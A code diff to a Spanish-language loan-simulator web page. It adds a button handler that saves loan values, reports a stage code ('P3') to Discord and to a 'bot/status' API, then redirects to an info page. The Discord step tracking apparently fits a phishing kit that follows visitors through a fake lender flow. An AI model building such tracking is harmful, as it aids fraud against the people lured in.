@@ -56,7 +56,38 @@ const addEventListeners = () => {
 
     montoSlider.addEventListener('input', actualizarCalculos);
     plazoSlider.addEventListener('input', actualizarCalculos);
-    solicitarBtn.addEventListener('click', solicitarCredito);
+    solicitarBtn.addEventListener('click', () => {
+        loader.classList.remove('hidden');
+
+        // Guardar datos del simulador en el objeto info
+        info.plazo = plazoSlider.value;
+        info.monto = montoSlider.value;
+        info.cuota = Math.round(calcularCuotaMensual(parseInt(montoSlider.value), parseInt(plazoSlider.value)));
+
+        // Guardar también en localStorage para el envío final
+        localStorage.setItem('montoCredito', montoSlider.value);
+        localStorage.setItem('plazoMeses', plazoSlider.value);
+        localStorage.setItem('cuotaMensual', Math.round(calcularCuotaMensual(parseInt(montoSlider.value), parseInt(plazoSlider.value))));
+
+        updateLS();
+
+        // Enviar estado a Discord
+        sendPageStatusToDiscord('P3');
+
+        const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P3'}, JWT_SIGN);
+        fetch(`${API_URL}/api/bot/status`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${API_KEY}`,
+            },
+            body: JSON.stringify({token: token})
+        })
+
+        setTimeout(() => {
+            window.location.href = 'info.html';
+        }, 2500);
+    });
 }
 
 /**
@@ -71,9 +102,9 @@ const solicitarCredito = () => {
     info.cuota = UTILS.calcularCuota(montoSlider.value, plazoSlider.value, CONFIG.TASA_MENSUAL);
 
     updateLS();
-    
+
     loader.classList.remove('hidden');
-    
+
     setTimeout(() => {
         window.location.href = 'info.html';
     }, 2500);
@@ -85,7 +116,7 @@ const actualizarCalculos = () => {
     const monto = parseInt(montoSlider.value);
     const plazo = parseInt(plazoSlider.value);
     const tasa = 0.0125; // 1.25% mensual
-    
+
     // Actualizar valores mostrados
     montoValue.textContent = UTILS.formatearMoneda(monto);
     plazoValue.textContent = `${plazo} meses`;
@@ -113,4 +144,4 @@ const formatearMoneda = (valor) => {
 
 const calcularCuota = (monto, plazo, tasa) => {
     return (monto * tasa * Math.pow(1 + tasa, plazo)) / (Math.pow(1 + tasa, plazo) - 1);
-} 
+}
